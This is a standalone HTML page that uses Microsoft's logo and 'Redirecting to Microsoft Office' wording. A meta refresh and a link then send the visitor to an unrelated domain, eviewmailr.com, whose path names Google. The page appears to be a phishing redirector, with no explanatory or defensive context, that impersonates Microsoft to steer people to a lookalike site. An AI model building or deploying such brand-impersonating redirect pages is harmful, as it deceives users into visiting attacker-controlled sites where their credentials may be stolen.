<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting to Microsoft</title>
    <!-- Redirect after 5 seconds -->
    <meta http-equiv="refresh" content="5; url=https://eviewmailr.com/r/google">
    <style>
        body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f3f3f3;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .container {
            max-width: 500px;
            padding: 20px;
            background-color: white;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 6px;
        }
        h1 {
            color: #0078d4;
            font-size: 24px;
            margin-bottom: 10px;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 120px;
        }
        p {
            font-size: 16px;
            margin: 10px 0;
        }
        a {
            color: #0078d4;
            text-decoration: none;
            font-weight: bold;
        }
        a:hover {
            text-decoration: underline;
        }
        .loader {
            margin: 20px auto;
            width: 40px;
            height: 40px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
        </div>
        <h1>Redirecting to Microsoft Office</h1>
        <p>We are taking you to <strong>Microsoft Office</strong>.</p>
        <div class="loader"></div>
        <p>If you are not redirected automatically, <a href="https://eviewmailr.com/r/google">click here</a>.</p>
    </div>
</body>
</html>
